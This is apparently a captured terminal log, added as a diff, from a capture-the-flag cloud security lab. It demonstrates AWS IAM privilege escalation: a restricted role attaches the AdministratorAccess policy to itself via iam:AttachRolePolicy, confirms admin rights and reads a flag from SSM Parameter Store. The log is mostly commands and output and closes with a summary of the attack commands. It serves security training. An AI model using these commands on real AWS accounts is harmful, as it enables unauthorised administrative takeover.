@@ -1,0 +1,80 @@
+[0;32m========================================[0m
+[0;32mIAM AttachRolePolicy Privilege Escalation Demo[0m
+[0;32m========================================[0m
+[1;33mRole-Based Self-Escalation[0m
+
+[1;33mStep 1: Getting starting user credentials from Terraform[0m
+Retrieved access key for: pl-prod-iam-009-to-admin-starting-user
+Access Key ID: AKIA2E4JP2...
+ReadOnly Key ID: AKIA2E4JP2...
+Region: us-east-1
+[0;32m✓ Retrieved credentials for pl-prod-iam-009-to-admin-starting-user[0m
+
+[1;33m[demo_permissions] Restricting helpful permissions for validation...[0m
+  Denied helpful permissions on user: pl-prod-iam-009-to-admin-starting-user
+[1;33m[demo_permissions] Waiting 15s for IAM policy propagation...[0m
+[0;32m[demo_permissions] Helpful permissions restricted[0m
+[1;33mStep 2: Verifying identity[0m
+[2m[Attacker] $ aws sts get-caller-identity --query 'Arn' --output text[0m
+Current identity: arn:aws:iam::123456789012:user/pl-prod-iam-009-to-admin-starting-user
+[0;32m✓ Verified identity as pl-prod-iam-009-to-admin-starting-user[0m
+
+[1;33mStep 3: Assuming starting role[0m
+Role ARN: arn:aws:iam::123456789012:role/pl-prod-iam-009-to-admin-starting-role
+[2m[Attacker] $ aws sts assume-role --role-arn "arn:aws:iam::123456789012:role/pl-prod-iam-009-to-admin-starting-role" --role-session-name "arp-demo-session"[0m
+[0;32m✓ Successfully assumed role pl-prod-iam-009-to-admin-starting-role[0m
+
+[1;33mStep 4: Testing current permissions[0m
+Attempting to list IAM users (should fail)...
+[2m[Attacker] $ aws iam list-users --max-items 1[0m
+[0;32m✓ Confirmed limited permissions[0m
+
+[1;33mStep 5: Escalating privileges via iam:AttachRolePolicy[0m
+Attaching AdministratorAccess managed policy to self...
+
+[0;36m[Attacker] $ aws iam attach-role-policy --role-name "pl-prod-iam-009-to-admin-starting-role" --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"[0m
+[0;32m✓ Successfully attached AdministratorAccess policy to self![0m
+
+[1;33mWaiting 15 seconds for policy changes to propagate...[0m
+
+[1;33mStep 6: Verifying administrator access[0m
+Checking if AdministratorAccess is now attached to the starting role...
+[2m[ReadOnly] $ aws iam list-attached-role-policies --role-name "pl-prod-iam-009-to-admin-starting-role" --query 'AttachedPolicies[*].PolicyArn' --output text[0m
+[0;32m✓ AdministratorAccess policy is attached to pl-prod-iam-009-to-admin-starting-role[0m
+
+Attempting to list IAM users...
+[2m[ReadOnly] $ aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text[0m
+[0;32m✓ Successfully listed IAM users: pathrunner-admin-1772582225	pathrunner-admin-1772582487	pathrunner-admin-1772582552	pathrunner-admin-1772590136	pl-admin-user-for-cleanup-scripts
+None[0m
+[0;32m✓ Confirmed administrator access![0m
+
+[1;33mStep 7: Capturing CTF flag from SSM Parameter Store[0m
+
+[0;36m[Attacker (now admin)] $ aws ssm get-parameter --name /pathfinding-labs/flags/iam-009-to-admin --query 'Parameter.Value' --output text[0m
+[0;32m✓ Flag captured: flag{iam_009_admin_captured}[0m
+
+[1;33m[demo_permissions] Restoring helpful permissions...[0m
+  Restored user: pl-prod-iam-009-to-admin-starting-user
+[0;32m[demo_permissions] Helpful permissions restored[0m
+
+[0;32m========================================[0m
+[0;32m✅ CTF FLAG CAPTURED![0m
+[0;32m========================================[0m
+
+[1;33mAttack Summary:[0m
+Starting Point: User [1;33mpl-prod-iam-009-to-admin-starting-user[0m
+Step 1: Assumed role [1;33mpl-prod-iam-009-to-admin-starting-role[0m
+Step 2: Used [1;33miam:AttachRolePolicy[0m to attach AdministratorAccess to self
+Step 3: Re-assumed role to pick up escalated permissions
+Step 4: Captured CTF flag from SSM Parameter Store: [0;32mflag{iam_009_admin_captured}[0m
+Result: [0;32mAdministrator Access + CTF Flag[0m
+
+[1;33mAttack Path:[0m
+  pl-prod-iam-009-to-admin-starting-user → (AssumeRole) → pl-prod-iam-009-to-admin-starting-role → (AttachRolePolicy on self) → Admin → (ssm:GetParameter) → CTF Flag
+
+[1;33mAttack Commands:[0m
+  [0;36m$ aws iam attach-role-policy --role-name "pl-prod-iam-009-to-admin-starting-role" --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"[0m
+  [0;36m$ aws ssm get-parameter --name /pathfinding-labs/flags/iam-009-to-admin --query 'Parameter.Value' --output text[0m
+
+[0;31mIMPORTANT: Run cleanup_attack.sh to detach the AdministratorAccess policy[0m
+
